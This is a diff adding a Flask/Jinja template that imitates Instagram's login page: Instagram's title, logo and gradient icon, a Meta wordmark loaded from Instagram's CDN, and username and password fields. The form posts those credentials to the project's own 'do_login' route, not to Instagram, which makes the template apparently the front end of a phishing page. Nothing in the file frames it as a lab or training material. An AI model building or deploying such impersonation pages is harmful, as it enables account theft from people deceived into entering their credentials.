@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram – Log in</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}"/>
+</head>
+<body>
+
+<!-- Flash messages -->
+{% with messages = get_flashed_messages(with_categories=true) %}
+  {% if messages %}
+    <div class="flash-messages">
+      {% for category, message in messages %}
+        <div class="flash {{ category }}">{{ message }}</div>
+      {% endfor %}
+    </div>
+  {% endif %}
+{% endwith %}
+
+<!-- Reusable Instagram icon -->
+<svg width="0" height="0" style="position:absolute">
+  <defs>
+    <radialGradient id="ig-grad" cx="30%" cy="107%" r="150%">
+      <stop offset="0%"   stop-color="#feda75"/>
+      <stop offset="18%"  stop-color="#fa7e1e"/>
+      <stop offset="42%"  stop-color="#d62976"/>
+      <stop offset="70%"  stop-color="#962fbf"/>
+      <stop offset="100%" stop-color="#4f5bd5"/>
+    </radialGradient>
+    <symbol id="ig-icon" viewBox="0 0 48 48">
+      <rect width="48" height="48" rx="12" fill="url(#ig-grad)"/>
+      <rect x="8" y="8" width="32" height="32" rx="9"
+            fill="none" stroke="white" stroke-width="3"/>
+      <circle cx="24" cy="24" r="8"
+              fill="none" stroke="white" stroke-width="3"/>
+      <circle cx="35" cy="13" r="2.2" fill="white"/>
+    </symbol>
+  </defs>
+</svg>
+
+<div class="page">
+
+  <!-- Language selector -->
+  <div class="lang-bar">English (US)</div>
+
+  <!-- Logo -->
+  <div class="logo-wrap">
+    <img src="/static/logo.png" alt="" class="ig_logo">
+  </div>
+
+  <!-- Login form -->
+  <form class="form-area" method="POST" action="{{ url_for('do_login') }}">
+    <input
+      class="input-field"
+      type="text"
+      name="username"
+      placeholder="Username, email address or mobile …"
+      autocomplete="username"
+    />
+    <input
+      class="input-field"
+      type="password"
+      name="password"
+      placeholder="Password"
+      autocomplete="current-password"
+    />
+    <button class="btn-login" type="submit"><div class="login_text"><span data-bloks-name="bk.components.TextSpan" style="color: rgb(255, 255, 255); font-weight: 500; display: inline; font-size: 16px; font-family: sans-serif; white-space: pre-wrap; overflow-wrap: break-word;">Log in</span></div></button>
+  </form>
+
+  <a href="#" class="forgot-pw">Forgot password?</a>
+
+  <!-- Bottom actions -->
+  <div class="bottom-section">
+    <a href="#" class="btn-create">Create new account</a>
+
+    <div class="meta-logo">
+      <!-- Meta ∞ wordmark -->
+      <img src="https://static.cdninstagram.com/rsrc.php/yU/r/u_xNYO0VfQm.webp" alt="" class="meta_logo">
+    </div>
+  </div>
+
+</div>
+
+<script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
